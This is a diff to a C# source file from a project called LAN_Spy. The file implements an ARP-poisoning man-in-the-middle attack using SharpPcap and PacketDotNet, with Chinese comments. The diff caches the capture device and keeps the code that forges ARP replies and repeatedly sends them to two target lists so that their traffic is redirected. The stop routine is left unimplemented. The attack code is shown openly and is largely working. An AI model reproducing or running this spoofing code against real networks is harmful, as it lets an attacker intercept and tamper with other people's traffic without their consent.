@@ -1,14 +1,8 @@
-﻿using System;
+﻿using PacketDotNet;
+using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
-using System.Linq;
 using System.Net;
-using System.Net.NetworkInformation;
-using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
-using PacketDotNet;
 using SharpPcap;
 
 namespace LAN_Spy {
@@ -22,6 +16,11 @@ namespace LAN_Spy {
         public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
 
         /// <summary>
+        ///     使用设备缓存。
+        /// </summary>
+        private ICaptureDevice _device;
+
+        /// <summary>
         ///     毒化目标缓存。
         /// </summary>
         private List<Host> _target1, _target2;
@@ -29,10 +28,10 @@ namespace LAN_Spy {
         /// <summary>
         ///     毒化线程句柄
         /// </summary>
-        private List<Thread> _poisonThreads = new List<Thread>();
+        private readonly List<Thread> _poisonThreads = new List<Thread>();
 
         /// <summary>
-        ///     根据设定的 <see cref="ReadOnlyCollection{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
+        ///     根据设定的 <see cref="List{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
         /// </summary>
         /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
         public void StartPoisoning() {
@@ -47,6 +46,10 @@ namespace LAN_Spy {
                 _target1.Add(new Host(target.IPAddress, target.PhysicalAddress));
             foreach (var target in Target2)
                 _target2.Add(new Host(target.IPAddress, target.PhysicalAddress));
+
+            // 缓存并打开当前设备
+            _device = DeviceList[CurDevIndex];
+            _device.Open();
 
             // 开始毒化
             foreach (var target in _target1) {
@@ -74,18 +77,15 @@ namespace LAN_Spy {
                 
                 // 转存目标
                 var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
-
-                // 获取当前设备
-                var device = DeviceList[CurDevIndex];
                 
                 // 构建包信息
-                EthernetPacket ether = new EthernetPacket(device.MacAddress,
+                EthernetPacket ether = new EthernetPacket(_device.MacAddress,
                     host.PhysicalAddress,
                     EthernetPacketType.Arp);
                 ARPPacket arp = new ARPPacket(ARPOperation.Response,
                     host.PhysicalAddress,
                     host.IPAddress,
-                    device.MacAddress,
+                    _device.MacAddress,
                     new IPAddress(new byte[] {0, 0, 0, 0})) {
                     HardwareAddressType = LinkLayers.Ethernet,
                     ProtocolAddressType = EthernetPacketType.IpV4
@@ -98,7 +98,7 @@ namespace LAN_Spy {
                     foreach (var target in targets) {
                         arp.SenderProtocolAddress = target.IPAddress;
                         arp.UpdateCalculatedValues();
-                        device.SendPacket(ether);
+                        _device.SendPacket(ether);
                     }
                     Thread.Sleep(500);
                 }
@@ -108,7 +108,7 @@ namespace LAN_Spy {
                     foreach (var target in targets) {
                         arp.SenderProtocolAddress = target.IPAddress;
                         arp.UpdateCalculatedValues();
-                        device.SendPacket(ether);
+                        _device.SendPacket(ether);
                     }
                     Thread.Sleep(5 * 1000);
                 }
@@ -121,6 +121,7 @@ namespace LAN_Spy {
         ///     停止ARP毒化中间人攻击。
         /// </summary>
         public void StopPoisoning() {
+            // _device.Close();
             throw new NotImplementedException();
         }
     }
